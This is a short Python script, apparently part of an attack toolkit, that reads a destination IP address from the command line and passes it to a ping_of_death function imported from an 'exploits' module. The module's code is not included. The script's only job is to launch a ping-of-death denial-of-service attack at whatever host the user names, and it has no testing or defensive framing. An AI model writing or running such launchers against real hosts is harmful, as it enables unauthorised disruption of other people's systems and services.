import sys

from exploits.pod import ping_of_death

if len(sys.argv) > 1:
    dest_ip = str(sys.argv[1])
else:
    print("Supply destination IP address.")
    sys.exit()

ping_of_death(dest_ip)